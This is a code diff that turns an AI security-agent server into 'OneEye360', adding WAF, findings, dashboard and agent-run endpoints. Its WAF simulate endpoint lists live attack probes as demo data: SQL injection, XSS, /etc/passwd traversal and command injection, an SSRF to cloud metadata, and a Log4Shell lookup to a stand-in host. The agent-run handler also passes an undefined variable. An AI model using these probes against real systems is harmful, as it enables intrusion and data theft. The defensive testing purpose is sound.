@@ -14,6 +14,9 @@ import rateLimit from 'express-rate-limit';
 // MUST import chrome-shim before any brain files
 import './adapters/chrome-shim.js';
 import { initBrowser, createPage, closePage, getActivePageId } from './adapters/browser-pool.js';
+import { EventStore } from './src/server/event-store.js';
+import { WafEngine } from './src/server/waf-engine.js';
+import { AgentOrchestrator } from './src/server/agent-orchestrator.js';
 
 // Now import brain files (they use globalThis.chrome from the shim)
 import { AgentLoop } from './src/background/agent-loop.js';
@@ -31,6 +34,11 @@ if (!existsSync(downloadsDir)) mkdirSync(downloadsDir, { recursive: true });
 
 // ---- Initialize Agent ----
 const agent = new AgentLoop();
+
+// ---- OneEye360 platform services ----
+const eventStore = new EventStore(dataDir);
+const wafEngine = new WafEngine(dataDir, eventStore);
+const orchestrator = new AgentOrchestrator(agent, eventStore, wafEngine);
 
 // Pre-populate storage from env if provided
 async function initFromEnv() {
@@ -139,7 +147,7 @@ app.use(express.static(join(__dirname, 'public'), {
 
 // API: Health check
 app.get('/api/health', _checkAuth, (req, res) => {
-  res.json({ status: 'ok', version: '1.0.0' });
+  res.json({ status: 'ok', version: '2.0.0', product: 'OneEye360' });
 });
 
 // API: Get settings
@@ -300,6 +308,156 @@ app.post('/api/execute-workflow', _checkAuth, async (req, res) => {
   }
 });
 
+// ============================================================
+// OneEye360 — Dashboard API over the event store
+// ============================================================
+
+// API: Dashboard summary (posture score, counts — plain language)
+app.get('/api/dashboard/summary', _checkAuth, (req, res) => {
+  res.json(eventStore.getSummary());
+});
+
+// API: Posture timeline (daily buckets for the chart)
+app.get('/api/dashboard/timeline', _checkAuth, (req, res) => {
+  const days = Math.min(Math.max(parseInt(req.query.days) || 30, 7), 90);
+  res.json({ days, timeline: eventStore.getTimeline({ days }) });
+});
+
+// API: Attack log (WAF decisions, filterable)
+app.get('/api/attacks', _checkAuth, (req, res) => {
+  const { attackType, action, severity, limit = 100, offset = 0 } = req.query;
+  const events = eventStore.query({
+    types: ['waf_decision'],
+    attackType: attackType || undefined,
+    severity: severity || undefined,
+    limit: Math.min(parseInt(limit) || 100, 500),
+    offset: Math.max(parseInt(offset) || 0, 0),
+  });
+  const items = events
+    .filter((e) => !action || e.action === action)
+    .map(EventStore.toListItem);
+  res.json({ items, count: items.length });
+});
+
+// API: Findings (verified agent findings, filterable)
+app.get('/api/findings', _checkAuth, (req, res) => {
+  const { severity, status, limit = 100, offset = 0 } = req.query;
+  let items = eventStore.query({
+    types: ['finding'],
+    severity: severity || undefined,
+    limit: Math.min(parseInt(limit) || 100, 500),
+    offset: Math.max(parseInt(offset) || 0, 0),
+  }).map(EventStore.toListItem);
+  if (status) items = items.filter((f) => (f.status || 'open') === status);
+  res.json({ items, count: items.length });
+});
+
+// API: Update finding status (open / acknowledged / fixed)
+app.patch('/api/findings/:id', _checkAuth, (req, res) => {
+  const { status, note } = req.body || {};
+  if (!['open', 'acknowledged', 'fixed'].includes(status)) {
+    return res.status(400).json({ error: 'status must be open | acknowledged | fixed' });
+  }
+  const updated = eventStore.updateFindingStatus(req.params.id, status, note);
+  if (!updated) return res.status(404).json({ error: 'Finding not found' });
+  res.json({ success: true, finding: EventStore.toListItem(updated) });
+});
+
+// API: WAF evaluate a payload (testing / lab)
+app.post('/api/waf/evaluate', _checkAuth, (req, res) => {
+  const { payload, method, path, headers, body } = req.body || {};
+  if (payload === undefined && !path && !body) {
+    return res.status(400).json({ error: 'payload or request data required' });
+  }
+  const decision = (path || body)
+    ? wafEngine.evaluateRequest({ method, path, headers, body, query: payload })
+    : wafEngine.evaluatePayload(payload);
+  res.json(decision);
+});
+
+// API: WAF simulate — replay classic OWASP-class probes to demo blocking
+app.post('/api/waf/simulate', _checkAuth, (req, res) => {
+  const probes = [
+    { label: 'SQL injection', path: '/login', body: "username=admin' OR 1=1--&password=x" },
+    { label: 'XSS', path: '/search', body: '<script>alert("xss")</script>' },
+    { label: 'Path traversal', path: '/download?file=../../etc/passwd' },
+    { label: 'Command injection', path: '/ping', body: '127.0.0.1; cat /etc/passwd' },
+    { label: 'SSRF probe', path: '/fetch?url=http://169.254.169.254/latest/meta-data/' },
+    { label: 'Log4Shell', path: '/api/user', headers: { 'X-Api-Version': '${jndi:ldap://evil.d/a}' } },
+    { label: 'Legitimate traffic', path: '/products?page=2&sort=price' },
+  ];
+  const results = probes.map((p) => ({
+    label: p.label,
+    decision: wafEngine.evaluateRequest({ method: 'GET', ...p }),
+  }));
+  res.json({ success: true, results });
+});
+
+// API: WAF rules (per-tenant, auto-tuned by agent findings)
+app.get('/api/waf/rules', _checkAuth, (req, res) => {
+  res.json({ rules: wafEngine.listRules(), stats: wafEngine.getStats() });
+});
+
+app.post('/api/waf/rules', _checkAuth, async (req, res) => {
+  const { pattern, attackType, severity, note } = req.body || {};
+  if (!pattern || !attackType) {
+    return res.status(400).json({ error: 'pattern and attackType are required' });
+  }
+  try {
+    const rule = await wafEngine.addRule({ pattern, attackType, severity, source: 'manual', note });
+    res.json({ success: true, rule });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+app.delete('/api/waf/rules/:id', _checkAuth, async (req, res) => {
+  const removed = await wafEngine.removeRule(req.params.id);
+  if (!removed) return res.status(404).json({ error: 'Rule not found' });
+  res.json({ success: true });
+});
+
+// API: Monthly posture report (plain language)
+app.get('/api/report/monthly', _checkAuth, (req, res) => {
+  res.json(eventStore.getMonthlyReport({ month: req.query.month }));
+});
+
+// API: Scoped agent run (synchronous — returns run report)
+app.post('/api/agent/runs', _checkAuth, async (req, res) => {
+  const { target, prompt, scope, budget, clear_conversation = true } = req.body || {};
+  if (!target && !prompt) {
+    return res.status(400).json({ error: 'target or prompt is required' });
+  }
+  if (target) {
+    try {
+      await createPage(target, { timeout: parseInt(process.env.BROWSER_TIMEOUT || '30000') });
+    } catch (err) {
+      console.warn(`[API] Navigation failed: ${err.message} — continuing without page context`);
+    }
+  }
+  try {
+    const result = await orchestrator.startRun({ target, prompt, scope, budget, clearConversation });
+    res.json({ success: true, ...result });
+  } catch (err) {
+    res.status(409).json({ success: false, error: err.message });
+  }
+});
+
+// API: Stop active run
+app.post('/api/agent/stop', _checkAuth, (req, res) => {
+  orchestrator.stopRun('stopped via API');
+  res.json({ success: true });
+});
+
+// API: Recent activity feed (all event types, for dashboard)
+app.get('/api/events', _checkAuth, (req, res) => {
+  const { types, limit = 50 } = req.query;
+  const typeList = types ? String(types).split(',') : undefined;
+  const items = eventStore.query({ types: typeList, limit: Math.min(parseInt(limit) || 50, 200) })
+    .map(EventStore.toListItem);
+  res.json({ items });
+});
+
 // API: Non-streaming agent execution — send prompt + target URL, get final result
 app.post('/api/agent', _checkAuth, async (req, res) => {
   const { prompt, target_url, clear_conversation = false } = req.body;
@@ -411,8 +569,11 @@ globalThis.__SERVER_PORT = PORT;
 const server = app.listen(PORT, HOST, async () => {
   await initFromEnv();
   await agent.init();
+  await eventStore.init();
+  await wafEngine.init();
   await initBrowser({ headless: process.env.BROWSER_HEADLESS !== 'false' });
-  console.log(`\n  CyberSec Agent Server running at http://${HOST}:${PORT}`);
+  console.log(`\n  OneEye360 — Autonomous AI Security Operations`);
+  console.log(`  Server running at http://${HOST}:${PORT}`);
   console.log(`  Provider: ${agent.provider}`);
   console.log(`  Model: ${agent.client.selectedModel || 'not set'}`);
   console.log(`  API Key: ${agent.client.hasApiKey() ? 'configured' : 'NOT SET'}`);
@@ -637,6 +798,8 @@ wss.on('connection', (ws, req) => {
         break;
 
       // ---- Server-specific: URL + prompt scan ----
+      // Routed through the orchestrator: scoped run + budget + verification layer
+      // + findings persisted to the event store (OneEye360 plan §08).
       case 'START_SCAN': {
         const { url, message } = msg;
 
@@ -645,7 +808,6 @@ wss.on('connection', (ws, req) => {
         const sessionDir = join(dataDir, 'sessions', sessionId);
         if (!existsSync(sessionDir)) mkdirSync(sessionDir, { recursive: true });
         agent.executor.setSessionDir(sessionDir);
-        console.log(`Session dir: ${sessionDir}`);
 
         // If URL provided, navigate the server browser to it
         if (url) {
@@ -660,13 +822,21 @@ wss.on('connection', (ws, req) => {
           }
         }
 
-        // Run the agent with the user's prompt
         const scanMessage = message || (url
           ? `Perform a full security assessment of ${url}. Check for OWASP Top 10 vulnerabilities, analyze forms, inspect headers, scan for secrets, and generate a comprehensive report.`
           : 'How can I help with your security assessment?');
 
         console.log(`Agent prompt: ${scanMessage.substring(0, 100)}...`);
-        await agent.run(scanMessage);
+        try {
+          await orchestrator.startRun({
+            target: url,
+            prompt: scanMessage,
+            scope: process.env.AGENT_SCOPE || 'web_app',
+            clearConversation: false, // panel chat keeps its own conversation
+          });
+        } catch (err) {
+          wsPort.postMessage({ type: MSG.BG_CHAT_ERROR, error: err.message });
+        }
         break;
       }
 
